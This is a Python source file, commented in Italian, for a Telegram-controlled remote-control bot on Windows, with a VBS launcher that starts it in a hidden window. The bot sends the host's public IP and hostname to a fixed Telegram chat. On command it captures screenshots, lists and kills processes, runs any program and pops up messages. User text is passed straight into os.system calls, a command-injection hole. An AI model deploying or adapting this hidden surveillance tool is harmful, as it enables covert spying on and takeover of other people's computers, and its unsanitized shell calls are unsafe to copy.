'''
IMPORTANT
This code is ugly. It just had to work. You can make it better.
I changed some parts to ********************** for privacy reasons
Install Python then install Python-Telegram-Bot and psutil with pip

starter.vbs:
Dim WShell
Set WShell = CreateObject("WScript.Shell")
WShell.Run """" & "<INDIRIZZO EXE>" & """", 0
Set WShell = Nothing

setup.cmd:
move "<SOURCE VBS>" "<DESTINATION VBS>"
mkdir "<DESTINATION SCREENSHOT EXE>"
move "<SOURCE SCREENSHOT EXE>" "<DESTINATION SCREENSHOT EXE >"
'''

from logging import Filter
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
import telegram
import os
import psutil
import socket
import datetime

TOKEN = "**********************"
CHATID = **********************
bot = telegram.Bot(token=TOKEN)

def greenSquare():
    return u'\U00002705'
def redSquare():
    return u'\U0000274C'

def waitForInternetConnection():
    try:
        host = socket.gethostbyname("www.google.com")
        s = socket.create_connection((host, 80), 2)
        print("Connessione avvenuta correttamente")
        return True
    except:
        pass
    return False

def checkIfProcessRunning(processName):
    '''
    Check if there is any running process that contains the given name processName.
    '''
    # Iterate over the all the running process
    for proc in psutil.process_iter():
        try:
            # Check if process name contains the given name string.
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False;

def listProcess():
    list = ""
    # Iterate over the all the running process
    for proc in psutil.process_iter():
        try:
            list +=greenSquare()+" - " + proc.name() +"\n"
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return list;

def killTelegram():
    if(telegramRunning()):
        os.system("taskkill /f /im Telegram.exe")

def telegramRunning():
    return checkIfProcessRunning("Telegram.exe")

def killDiscord():
    if(discordRunning()):
        os.system("taskkill /f /im Discord.exe")

def discordRunning():
    return checkIfProcessRunning("Discord.exe")

def killChrome():
    if(chromeRunning()):
        os.system("taskkill /f /im Chrome.exe")

def chromeRunning():
    return checkIfProcessRunning("Chrome.exe")

def updateUser(update, context):
    stringa = ""
    if(telegramRunning()):
        stringa += "Telegram " + greenSquare() 
    else:
       stringa +="Telegram "  + redSquare()
    stringa += "\n"

    if (discordRunning()):
        stringa += "Discord " + greenSquare()
    else:
        stringa += "Discord " + redSquare()
    stringa += "\n"

    if (chromeRunning()):
        stringa += "Chrome " + greenSquare()
    else:
        stringa += "Chrome " + redSquare()
    stringa += "\n" 

    update.message.reply_text(stringa)

def help(update, context):
    aiuto = "<b>HOW TO USE:</b>\n"
    aiuto += "<b>update</b>: <i>Controlla i processi attivi in questo momento</i>\n"
    aiuto += "<b>kill <U>%nome.exe%</U></b>: <i>Termina il programma specificato</i>\n"
    aiuto += "<b>run <U>%nome.exe%</U></b>: <i>Avvia il programma specificato</i>\n"
    aiuto += "<b>chrome</b>: <i>Termina il programma istantanemante</i>\n"
    aiuto += "<b>telegram</b>: <i>Termina il programma istantanemante</i>\n"
    aiuto += "<b>discord</b>: <i>Termina il programma istantanemante</i>\n"
    aiuto += "<b>messaggio: <U>%testo%</U></b>: <i>Message Box <U>%testo%</U></i>\n"
    aiuto += "<b>processi</b>: <i>Elenca tutti i processi attivi</i>\n"
    aiuto += "<b>screenshot</b>: <i>Ricevi uno screenshot in tempo reale</i>\n"
    print(aiuto)
    bot.send_message(chat_id=CHATID, text=aiuto, 
                  parse_mode=telegram.ParseMode.HTML)

def screenshot(update, context):
    os.system('''cd "%USERPROFILE%\Pictures\Tbot" /
    nircmdc.exe savescreenshot screen.jpg'''.replace('\n', '&'))
    path1 = os.popen('echo %USERPROFILE%').read()
    path = path1.replace('\n','')
    path+="\Pictures\Tbot\screen.jpg"
    print(path)
    update.message.reply_photo(open(path,'rb'))
    print("Screenshot inviato")

def img_handler(update, context):
    file = update.message.photo[0].file_id
    obj = context.bot.get_file(file)
    path1 = os.popen('echo %USERPROFILE%').read()
    path = path1.replace('\n','')
    path+="\Pictures\Tbot\output.jpg"
    obj.download(path)
    
    update.message.reply_text("Immagine ricevuta")

def start(update, context):
    if(waitForInternetConnection()):
        update.message.reply_text(greenSquare()+" Connessione avvenuta")
    x = datetime.datetime.now()
    update.message.reply_text("DateTime: "+x.strftime("%H:%M:%S")+"\n"+x.strftime("%d %B %Y"))
    chatid = update.message.chat.id
    ip = os.popen('curl ifconfig.me').read()
    hostname = os.popen('hostname').read().replace('\n', '')
    sysinfo="<b>CHAT ID:</b> " +str(chatid)+"\n<b>HOSTNAME:</b> "+hostname+"\n<b>IP:</b> "+ip
    bot.send_message(chat_id=CHATID, text=sysinfo, 
                parse_mode=telegram.ParseMode.HTML)
    update.message.reply_text("Use /help for more information")

def rispondi(update, context):
    testo = update.message.text.lower()

    if "update" in testo:
        updateUser(update, context)
        print("Update...")
    elif "kill" in testo:
        os.system("taskkill /f /im "+testo[4:])
        print("Kill "+testo[4:])    
    elif "run" in testo:
        os.system("start "+testo[3:])
        print("Start "+testo[3:])      
    elif "chrome" in testo:
        killChrome()
        update.message.reply_text("kill chrome")
        print("Kill Chrome")
    elif "screenshot" in testo:
        os.system('''cd "%USERPROFILE%\Pictures\Tbot" /
        nircmdc.exe savescreenshot screen.jpg'''.replace('\n', '&'))
        path1 = os.popen('echo %USERPROFILE%').read()
        path = path1.replace('\n','')
        path+="\Pictures\Tbot\screen.jpg"
        print(path)
        update.message.reply_photo(open(path,'rb'))
        print("Screenshot inviato")
    elif "processi" in testo:
        update.message.reply_text(listProcess())
        print("Lista Processi: \n "+listProcess())
    elif "messaggio:" in testo:
        os.system("msg %username% "+ testo[10:])
        print(testo)
    elif "discord" in testo:
        killDiscord()
        update.message.reply_text("kill Discord")
        print("Kill Discord")
    elif "telegram" in testo:
        killTelegram()
        update.message.reply_text("kill Telegram")
        print("Kill Telegram")
    else: 
        update.message.reply_text("Comando non riconosciuto, riprovare")
        print("Comando non riconosciuto, riprovare")

updater = Updater(TOKEN)
updater.dispatcher.add_handler(CommandHandler('start', start, filters=Filters.chat([CHATID])))
updater.dispatcher.add_handler(CommandHandler('help', help, filters=Filters.chat([CHATID])))
updater.dispatcher.add_handler(CommandHandler('screenshot', screenshot, filters=Filters.chat([CHATID])))
updater.dispatcher.add_handler(MessageHandler(Filters.text & Filters.chat([CHATID]), rispondi))
updater.dispatcher.add_handler(MessageHandler(Filters.photo & Filters.chat([CHATID]), img_handler))
print("Bot in ascolto...")
updater.start_polling()

